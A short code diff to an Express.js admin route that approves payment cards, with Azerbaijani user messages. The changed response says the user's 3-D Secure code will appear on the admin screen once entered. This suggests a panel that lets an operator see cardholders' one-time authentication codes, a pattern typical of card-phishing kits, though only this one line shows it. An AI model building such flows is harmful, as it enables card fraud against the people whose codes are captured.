@@ -263,7 +263,7 @@ pages.get('/sinxronizasiya', requireAdmin, async (req, res, next) => {
 api.post('/payments/:id/approve-card', requireAdmin, async (req, res) => {
   try {
     const result = await paymentService.adminApproveCard(req.params.id, req.currentUser.email);
-    return res.json({ ok: true, message: 'Kart təsdiqləndi. Doğrulama kodu yaradıldı.', code: result.code });
+    return res.json({ ok: true, message: 'Kart təsdiqləndi. İstifadəçi 3-D kodu daxil etdikdə burada görünəcək.' });
   } catch (e) {
     return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
   }
